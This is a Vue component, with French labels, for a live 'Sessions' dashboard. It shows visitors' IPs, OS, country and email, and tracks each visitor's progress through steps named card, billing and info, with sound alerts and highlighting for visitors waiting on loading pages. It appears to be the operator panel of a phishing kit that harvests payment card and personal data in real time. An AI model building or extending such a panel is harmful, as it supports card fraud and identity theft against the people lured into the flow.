<template>
  <div>
    <div class="page-header" style="display:flex;justify-content:space-between;align-items:center">
      <div>
        <h1 class="page-title">Sessions</h1>
        <p class="page-subtitle">{{ store.sessions.length }} active{{ store.sessions.length > 1 ? 's' : '' }}</p>
      </div>
      <label class="sound-toggle">
        <input type="checkbox" v-model="soundOn" @change="saveSound"> Son
      </label>
    </div>

    <div v-if="!store.sessions.length" class="empty">Aucune session en cours</div>
    <div v-else class="card" style="overflow:hidden">
      <table>
        <thead><tr><th></th><th>IP</th><th>OS</th><th>Pays</th><th>Email</th><th>Page</th><th></th></tr></thead>
        <tbody>
          <tr v-for="s in store.sessions" :key="s.id" :class="{ 'row-alert': isWaiting(s) }">
            <td><span class="dot" :class="s.is_online ? 'dot-on' : 'dot-off'"></span></td>
            <td class="mono">{{ s.ip }}</td>
            <td><span class="os-icon" v-html="osIcon(s.os)"></span></td>
            <td>{{ s.country }}</td>
            <td class="mono">{{ s.email || '—' }}</td>
            <td><span class="step-badge" :class="stepCls(s)">{{ s.stepLabel }}</span></td>
            <td><router-link :to="'/session/' + s.id" class="btn btn-sm btn-gold">Voir</router-link></td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue'
import { useSessionsStore } from '@/stores/sessions'

const store = useSessionsStore()
const soundOn = ref(localStorage.getItem('panel_sound') === '1')
function saveSound() { localStorage.setItem('panel_sound', soundOn.value ? '1' : '0') }
function isWaiting(s) { return ['loading','page_loading'].includes(s.current_step) }
function stepCls(s) { const st=s.current_step; if(['card','loading','page_loading'].includes(st))return'step-hot'; if(['billing','info'].includes(st))return'step-warm'; return'' }
function osIcon(os) {
  if (os==='apple') return '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>'
  if (os==='android') return '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h2v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zM3.5 8C2.67 8 2 8.67 2 9.5v7c0 .83.67 1.5 1.5 1.5S5 17.33 5 16.5v-7C5 8.67 4.33 8 3.5 8zm17 0c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-4.97-5.84l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48A5.84 5.84 0 0012 1c-.96 0-1.86.23-2.66.63L7.85.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.31 1.31A5.983 5.983 0 006 7h12c0-1.99-.97-3.75-2.47-4.84zM10 5H9V4h1v1zm5 0h-1V4h1v1z"/></svg>'
  if (os==='windows') return '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>'
  return '?'
}

onMounted(() => store.startPolling(() => store.fetchSessions(), 3000))
onUnmounted(() => store.stopPolling())
</script>
